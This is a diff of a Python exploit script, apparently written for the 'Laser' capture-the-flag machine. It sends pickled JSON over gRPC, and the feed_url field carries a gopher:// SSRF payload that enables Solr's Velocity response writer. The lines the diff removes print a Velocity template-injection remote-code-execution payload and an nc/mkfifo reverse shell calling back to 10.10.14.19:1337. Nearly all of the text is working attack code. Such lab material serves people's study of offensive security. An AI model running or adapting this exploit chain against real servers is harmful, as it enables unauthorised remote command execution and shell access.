@@ -25,27 +25,30 @@ import json
 import pickle
 import urllib
 
-rind = 1
+rind = 8
 
 def make_payload(payload):
-
+    print("--------------------------------------------------------------------------------")
     global rind
     print(payload)
     p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:8983","feed_url": "'+payload+'", "id":"'+ str(rind) + '"}'
     #p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:8983","feed_url": "'+payload+'"}'
-    rind +=1
     print(p)
+    rind += 1
 
     # For storing 
     p = pickle.dumps(p)     # type(b) gives <class 'bytes'> 
     p = base64.b64encode(p)
+    #p = base64.urlsafe_b64encode(p)
+    print()
+    print(base64.urlsafe_b64decode(p))
     return p 
 
 def run(t):
     # NOTE(gRPC Python Team): .close() is possible on a channel and should be
     # used in circumstances in which the with statement does not fit the needs
     # of the code.
-    print('a')
+    #channel = grpc.insecure_channel('laser.htb:9000')
     with grpc.insecure_channel('laser.htb:9000') as channel:
         stub = s_pb2_grpc.PrintStub(channel)
 
@@ -53,22 +56,13 @@ def run(t):
                 data = t,
                 )
 
-        print('b')
-        print(d)
         response = stub.Feed(d)
-        print('c')
 
-    print(response)
-    print("Greeter client received: " + response.feed)
+    #print(response)
+    #print("Greeter client received: " + response.feed)
 
 
 if __name__ == '__main__':
-    port = "8983"
-    node = "staging"
-
-    ###########################################################################
-    # activate port
-    ###########################################################################
     '''
     _POST /solr/test/config HTTP/1.1
     Host: localhost:8983
@@ -82,38 +76,9 @@ if __name__ == '__main__':
 
     {"update-queryresponsewriter": {"startup": "lazy", "name": "velocity", "class": "solr.VelocityResponseWriter", "template.base.dir": "", "solr.resource.loader.enabled": "true", "params.resource.loader.enabled": "true"}}
     '''
+    ###########################################################################
+    # activate port
+    ###########################################################################
     payload = "gopher://localhost:8983/_POST%20/solr/staging/config%20HTTP/1.1%0D%0AHost%3A%20localhost%3A8983%0D%0AConnection%3A%20close%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AAcccept%3A%20%2A/%2A%0D%0AContent-Type%3A%20application/json%0D%0AContent-Length%3A%20220%0D%0A%0D%0A%7B%22update-queryresponsewriter%22%3A%20%7B%22name%22%3A%20%22velocity%22%2C%20%22startup%22%3A%20%22lazy%22%2C%20%22params.resource.loader.enabled%22%3A%20%22true%22%2C%20%22template.base.dir%22%3A%20%22%22%2C%20%22solr.resource.loader.enabled%22%3A%20%22true%22%2C%20%22class%22%3A%20%22solr.VelocityResponseWriter%22%7D%7D"
-    temp = make_payload(payload)
-    run(temp)
-
-    ###########################################################################
-    # rce
-    ###########################################################################
-    '''
-    GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('nc 10.10.14.19 1337')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end HTTP/1.1
-    Host: localhost:8983
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
-    Accept: */*
-    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-    Content-Type: application/x-www-form-urlencoded
-    Cache: no-cache
-    Connection: close
-
-
-    '''
-
-    command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 1337 >/tmp/f"
-    command = "nc 10.10.14.19 1337"
-    command = urllib.parse.quote(command)
-    url = ("/select?q=1&wt=velocity&v.template=custom&v.template.custom="
-        "%23set($x=%27%27)+"
-        "%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+"
-        "%23set($chr=$x.class.forName(%27java.lang.Character%27))+"
-        "%23set($str=$x.class.forName(%27java.lang.String%27))+"
-        "%23set($ex=$rt.getRuntime().exec(%27" + command +
-        "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+"
-        "%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end")
-
-    payload = "http://localhost:8983/solr/staging" + url
     temp = make_payload(payload)
     run(temp)
